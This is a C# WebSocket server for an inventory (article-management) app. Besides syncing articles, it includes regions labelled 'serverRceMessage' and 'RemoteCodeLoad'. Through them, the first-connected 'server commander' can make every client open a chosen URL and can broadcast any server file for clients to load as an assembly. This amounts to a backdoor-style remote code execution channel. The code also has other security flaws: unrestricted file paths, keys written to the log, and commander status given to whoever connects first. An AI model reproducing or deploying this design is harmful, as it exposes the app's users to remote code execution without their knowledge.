using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using ArtikelverwaltungWebSocketServer.DataVars;
using ArtikelverwaltungWebSocketServer.Structs;
using WebSocketSharp;
using WebSocketSharp.Net.WebSockets;
using WebSocketSharp.Server;
using ErrorEventArgs = WebSocketSharp.ErrorEventArgs;

namespace ArtikelverwaltungWebSocketServer
{
    internal class Program
    {
        private class Client : WebSocketBehavior
        {
            private struct Connection
            {
                public WebSocketContext Context { get; set; }
                public string Id { get; set; }
            }
            
            private static int _connections;
            private static int _activeConnections;
            private static string _serverId = String.Empty;
            private static bool _isFirstConnection = true;
            private static readonly List<Connection> Connections = new List<Connection>();

            protected override void OnMessage(MessageEventArgs e)
            {
                Console.WriteLine("New message");
                if (e.IsText)
                {
                    Console.WriteLine("Message was text");
                    Console.WriteLine(e.Data);
                    
                    if(e.Data.StartsWith(_serverId)) Console.WriteLine("message was sent by server commander");

                    #region UserFunction
                    #region assemblyRequest
                    if (e.Data == "request assembly")
                    {
                        try
                        {
                            Console.WriteLine("Client requested assembly");
                            Send(File.ReadAllBytes("ArtikelverwaltungClientWebsocket.dll"));
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region getCurrency
                    else if (e.Data == "get currency")
                    {
                        try
                        {
                            Send("currency req " + Vars.Currency);
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region dataRequest
                    else if (e.Data == "request data")
                    {
                        try
                        {
                            Console.WriteLine("Client Requested data");
                            string data = "data sync ";
                            if (Data.Articles.Count == 0)
                            {
                                Console.WriteLine("1: List is empty");
                            }
                            else
                            {
                                int count = 0;
                                foreach (Article article in Data.Articles)
                                {
                                    count++;
                                    if (count != Data.Articles.Count)
                                    {
                                        data += article.Id + "|";
                                        data += article.Name + "|";
                                        data += article.Price + "|";
                                        data += article.Count + "~";
                                    }
                                    else
                                    {
                                        data += article.Id + "|";
                                        data += article.Name + "|";
                                        data += article.Price + "|";
                                        data += article.Count;
                                    }
                                }
                                Send(data);
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region broadCastStatus
                    else if (e.Data == "broadcast status")
                    {
                        try
                        {
                            Console.WriteLine("client requested status broadcast");
                            Sessions.Broadcast("status " + _connections + " " + _activeConnections);
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #endregion

                    #region EditFunctions
                    #region addRequest
                    else if (e.Data.StartsWith("add "))
                    {
                        try
                        {
                            string data = e.Data.Substring(4);
                            string[] info = data.Split('~');
                            string key = info[0];
                            string action = info[1];
                            if (key == Vars.EditKey || key == Vars.AdminKey)
                            {
                                string[] request = action.Split('|');
                                Article temp = new Article();
                                if (request[0].Replace("|", String.Empty).ToLower() == "a")
                                {
                                    temp.Id = Data.Articles.Count;
                                    temp.Name = request[1].Replace("|", string.Empty);
                                    temp.Price = Convert.ToDouble(request[2].Replace("|", string.Empty));
                                    temp.Count = Convert.ToInt32(request[3].Replace("|", string.Empty));
                                }
                                else
                                {
                                    temp.Id = Convert.ToInt32(request[0].Replace("|", string.Empty));
                                    temp.Name = request[1].Replace("|", string.Empty);
                                    temp.Price = Convert.ToDouble(request[2].Replace("|", string.Empty));
                                    temp.Count = Convert.ToInt32(request[3].Replace("|", string.Empty));
                                }
                                Data.Articles.Add(temp);
                                
                                BroadcastList();
                            }
                            else
                            {
                                Console.WriteLine("tried to use a invalid key: " + key);
                                Send("2: Key rejected");
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region deleteRequest
                    if (e.Data.StartsWith("remove "))
                    {
                        try
                        {
                            string data = e.Data.Substring(7);
                            string[] info = data.Split('~');
                            string key = info[0];
                            string action = info[1];
                            if (key == Vars.EditKey || key == Vars.AdminKey)
                            {
                                string[] request = action.Split('|');
                                Article temp = new Article
                                {
                                    Id = Convert.ToInt32(request[0].Replace("|", string.Empty)),
                                    Name = request[1].Replace("|", string.Empty),
                                    Price = Convert.ToDouble(request[2].Replace("|", string.Empty)),
                                    Count = Convert.ToInt32(request[3].Replace("|", string.Empty))
                                };
                                Data.Articles.Remove(temp);
                                
                                BroadcastList();
                            }
                            else
                            {
                                Console.WriteLine("Client used a incorrect key " + key);
                                Send("2: Key rejected");
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #endregion

                    #region AdministrativeFunctions
                    #region closeServerRequest
                    else if (e.Data.StartsWith("close server "))
                    {
                        try
                        {
                            Console.WriteLine("client requested server close");
                            string key = e.Data.Substring(13);
                            if (key == Vars.AdminKey)
                            {
                                Console.WriteLine("disconnecting sockets and closing server");
                                foreach (IWebSocketSession toClose in Sessions.Sessions)
                                {
                                    Sessions.CloseSession(toClose.ID);
                                }
                                _socket.Stop();
                                Environment.Exit(0xDEAD);
                            }
                            else
                            {
                                Console.WriteLine("Client used a incorrect key");
                                Send("2: Key rejected");
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region saveServerList
                    else if (e.Data.StartsWith("save server list "))
                    {
                        try
                        {
                            Console.WriteLine("Client requested list save");
                            string key = e.Data.Substring(17);
                            if (key == Vars.AdminKey)
                            {
                                Console.WriteLine("Saving list to file");
                                int count = 0;
                                string toWrite = string.Empty;
                                foreach (Article article in Data.Articles)
                                {
                                    count++;
                                    if (Data.Articles.Count == count)
                                    {
                                        toWrite += article.Id + "|" + article.Name + "|" + article.Price + "|" + article.Count;
                                    }
                                    else
                                    {
                                        toWrite += article.Id + "|" + article.Name + "|" + article.Price + "|" + article.Count + "~";
                                    }
                                }
                                File.WriteAllText("data.dat", toWrite);
                            }
                            else
                            {
                                Console.WriteLine("Client used a incorrect key");
                                Send("2: Key rejected");
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region clearList
                    else if (e.Data.StartsWith("clear server list "))
                    {
                        try
                        {
                            Console.WriteLine("Client requested list clear");
                            string key = e.Data.Substring(18);
                            if (key == Vars.AdminKey)
                            {
                                Console.WriteLine("Clearing list");
                                Data.Articles = new List<Article>();
                                BroadcastList();
                            }
                            else
                            {
                                Console.WriteLine("Client used a incorrect key");
                                Send("2: Key rejected");
                            }
                        }
                        catch (Exception ex)
                        {
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #endregion

                    #region ServerExclusiveFunctions
                    #region serverRceMessage
                    else if (e.Data.StartsWith(_serverId + "open "))
                    {
                        try
                        {
                            string data = e.Data.Substring(37);
                            Sessions.Broadcast("open this " + data);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Something went wrong");
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #region RemoteCodeLoad
                    else if (e.Data.StartsWith(_serverId + "load "))
                    {
                        try
                        {
                            Console.WriteLine("client requested to load assembly on clients");
                            string data = e.Data.Substring(37);
                            Sessions.Broadcast(File.ReadAllBytes(data));
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Something went wrong: " + ex.Message);
                            Send("3: Something went wrong : " + ex.Message);
                        }
                    }
                    #endregion
                    #endregion
                }
                else
                {
                    Send("Invalid request");
                }
            }

            private void BroadcastList()
            {
                string toBroadcast = "data sync ";
                int count = 0;
                foreach (Article article in Data.Articles)
                {
                    count++;
                    if (count != Data.Articles.Count)
                    {
                        toBroadcast += article.Id + "|";
                        toBroadcast += article.Name + "|";
                        toBroadcast += article.Price + "|";
                        toBroadcast += article.Count + "~";
                    }
                    else
                    {
                        toBroadcast += article.Id + "|";
                        toBroadcast += article.Name + "|";
                        toBroadcast += article.Price + "|";
                        toBroadcast += article.Count;
                    }
                }

                Sessions.Broadcast(toBroadcast);
            }

            protected override void OnOpen()
            {
                IWebSocketSession client = Sessions.Sessions.Last();
                Console.WriteLine($"{client.ID} connected from {client.Context.UserEndPoint}");
                _connections++;
                _activeConnections++;
                Console.WriteLine("<======================================================================================================>");
                Console.WriteLine($"New Connection from ({Context.UserEndPoint}) Connections: [{_connections}] Active: [{_activeConnections}]");
                if (_isFirstConnection)
                {
                    _serverId = client.ID;
                    Sessions.SendTo(client.ID, client.ID);
                    Console.WriteLine("--------------------------------------------------------------------------------------------------------");
                    Console.WriteLine(client.ID + " is now server commander");
                    _isFirstConnection = false;
                }
                Console.WriteLine("--------------------------------------------------------------------------------------------------------");
                Console.WriteLine("Currently connected clients:");
                foreach (IWebSocketSession se in Sessions.Sessions)
                {
                    Console.WriteLine($"{se.ID} from {se.Context.UserEndPoint} | Started: {se.StartTime} | State: {se.State} | Time connected: {DateTime.Now - se.StartTime}");
                }
                Console.WriteLine("<======================================================================================================>");
                Connection temp = new Connection {Context = Context, Id = client.ID};
                Connections.Add(temp);
                Sessions.Broadcast("status " + _connections + " " + _activeConnections);
            }

            protected override void OnClose(CloseEventArgs e)
            {
                try
                {
                    _activeConnections--;
                    Connection temp = new Connection();
                    foreach (Connection con in Connections)
                    {
                        if (con.Context == Context)
                        {
                            temp = con;
                        }
                    }
                    Console.WriteLine("<======================================================================================================>");
                    Console.WriteLine($"Connection Closed ({temp.Id})");
                    Console.WriteLine("Currently connected clients:");
                    foreach (IWebSocketSession se in Sessions.Sessions)
                    {
                        Console.WriteLine($"{se.ID} from {se.Context.UserEndPoint} | Started: {se.StartTime} | State: {se.State} | Time connected: {DateTime.Now - se.StartTime}");
                    }
                    Console.WriteLine("<======================================================================================================>");
                    Sessions.Broadcast("status " + _connections + " " + _activeConnections);
                    Connections.Remove(temp);
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            protected override void OnError(ErrorEventArgs e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static WebSocketServer _socket;

        internal static bool IsReady = false;
        
        public static void Main()
        {
            Data.Articles = new List<Article>();
            
            #region socketStuff
            Console.Write("Do you want to start the server global or only local? (g = global | l = local) ");
            string input = Console.ReadLine();
            int port;
            if (input == "g")
            {
                Console.WriteLine("Please input the port you want the server to use");
                port = Convert.ToInt32(Console.ReadLine());
                _socket = new WebSocketServer(port);
            }
            else
            {
                _socket = new WebSocketServer("ws://127.0.0.1");
                port = 80;
            }
            Console.Clear();
            _socket.AddWebSocketService<Client>("/artikelverwaltung");
            _socket.Log.Level = LogLevel.Fatal;
            _socket.Start();
            Console.WriteLine("Server started");
            #endregion
            
            #region dataReading
            if (File.Exists("data.dat"))
            {
                try
                {
                    FileInfo info = new FileInfo("data.dat");
                    Console.WriteLine($"Reading data from {info.LastWriteTime}");
                    string fileContents = File.ReadAllText("data.dat");
                    string[] savedArticles = fileContents.Split('~');
                    foreach (string loadArticle in savedArticles)
                    {
                        string[] temp = loadArticle.Replace("~", string.Empty).Split('|');
                        Article temp2 = new Article
                        {
                            Id = Convert.ToInt32(temp[0].Replace("|", string.Empty)),
                            Name = temp[1].Replace("|", string.Empty),
                            Price = Convert.ToDouble(temp[2].Replace("|", string.Empty)),
                            Count = Convert.ToInt32(temp[3].Replace("|", string.Empty))
                        };
                        Data.Articles.Add(temp2);
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }
            else
            {
                Console.WriteLine("No past data found");
            }
            #endregion

            #region DiscordStuff
            Console.Clear();
            Console.Write("Do you wish to load the Discord bot version? (y = yes)");
            if (Console.ReadLine()?.ToLower() == "y")
            {
                Discord.DiscordManager.Init();
                while (!IsReady)
                {
                    Thread.Sleep(10);
                }
            }
            #endregion

            #region variableInputs
            while (string.IsNullOrEmpty(Vars.Currency) || string.IsNullOrWhiteSpace(Vars.Currency))
            {
                Console.Write("Please input the currency you want the server to use: ");
                Vars.Currency = Console.ReadLine();
                Console.Clear();
            }
            while (string.IsNullOrEmpty(Vars.AdminKey) || string.IsNullOrWhiteSpace(Vars.AdminKey))
            {
                Console.Write("Please set a admin key: ");
                Vars.AdminKey = Console.ReadLine();
                Console.Clear();
            }
            while (string.IsNullOrEmpty(Vars.EditKey) || string.IsNullOrWhiteSpace(Vars.EditKey))
            {
                Console.Write("Please set a edit key: ");
                Vars.EditKey = Console.ReadLine();
                Console.Clear();
            }
            #endregion

            #region menuStuff
            WebSocket client = new WebSocket($"ws://127.0.0.1:{port}/artikelverwaltung");
            string clientId = string.Empty;
            client.OnMessage += (sender, e) =>
            {
                if (clientId == string.Empty)
                {
                    if (e.IsText)
                    {
                        clientId = e.Data;
                    }
                }
            };
            client.Connect();
            while (true)
            {
                string inp = Console.ReadLine();
                if (inp == "open")
                {
                    Console.WriteLine("Enter the url you want the clients to open: ");
                    string toOpen = Console.ReadLine();
                    client.Send(clientId + "open " +  toOpen);
                }
                else if (inp == "load")
                {
                    try
                    {
                        Console.Write("Input the path to the file you want the clients to load: ");
                        string filePath = Console.ReadLine();
                        client.Send(clientId + "load " + filePath);
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Error");
                        Thread.Sleep(2500);
                    }
                }
            }
            #endregion
            // ReSharper disable once FunctionNeverReturns
        }
    }
}